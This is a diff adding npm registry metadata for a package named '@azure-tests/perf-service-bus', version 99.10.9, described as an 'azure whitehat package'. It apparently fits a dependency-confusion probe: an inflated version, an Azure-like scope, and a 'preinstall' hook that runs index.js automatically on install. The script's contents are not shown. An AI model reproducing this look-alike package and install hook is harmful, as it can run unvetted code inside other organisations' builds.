@@ -1,0 +1,39 @@
+{
+    "name": "@azure-tests/perf-service-bus",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "@azure-tests/perf-service-bus@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-WQBWlPP88865Oe5latIXqI4v3RsTlaVkRSpANVm1ZgKKzXsusNtDLUbu26XYkoQDfzCkIslGcQAbR3lEOlQQYw==",
+        "shasum": "0fdc091f9ff3056f5662de72ff4066645a9d4b90",
+        "tarball": "https://registry.npmjs.org/@azure-tests/perf-service-bus/-/perf-service-bus-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3593,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoRZICRA9TVsSAnZWagAAdPsP/0WOoTCqaYydegBwK9sj\nvov3swihNpPZ9Kq9L/sxSA7AS3+cph9wMaEWRZCp230qMUdtTVTGGDJJuH6U\nGZuwhMnuZVQ+CVkCVfsQby1Igq/JgYZj+TpW/y/CtCPrtjM20jUUXfGu/kNB\nsHDUdCBNXw9xUYTwEtUhJPpLebSdYLC9qGYY7LwL5eV+L2Bl4cMOpyOlAhRD\nDlvxq/SEOHycaOMBet41eWtKKDciorguohHReQoKjgjFzXViIHgLTzJ4oyIF\nvx3O30CGX38ojgcrEviF5bKzflw+gnmQpHwJE2G+QNoR5N8kYa0RTfyzqGsM\nLhCcWNuhpJuVSWu6Fvm4xFIUjRamysdgG4ewOZ01kTMfj3ozWti3UZnaI5aa\n6DEsO4j9SI0bzAj7yqhuZeGpJmUcRM3isqCRNZqz6DcqgdDym5rmMMfHVrqQ\nly0bMy31qYMZqs0tURFOgxQrAairphdIjsa3EOmiE0/MnSWVYY4BoeqXV+ZO\nXPRmDjkre657fLDD5oUjDptP4Y2/9nsbOzNI6RZtE8JPXriKJ0LOLNpB2oLB\nealyguLQapb9aZGr1U78CWayx+bHxOdZqOYX8A63H/APm/vnkdfzrIkfRqMv\ne4Erxidz/trkYBklYLeLvQJ8pCXl1MBQ8Fl4VsvU0qeL9Bk9UQfU3HxtWP2T\n02NW\r\n=Uho2\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-service-bus_99.10.9_1637946952046_0.35150621308001573"
+    },
+    "_hasShrinkwrap": false
+}
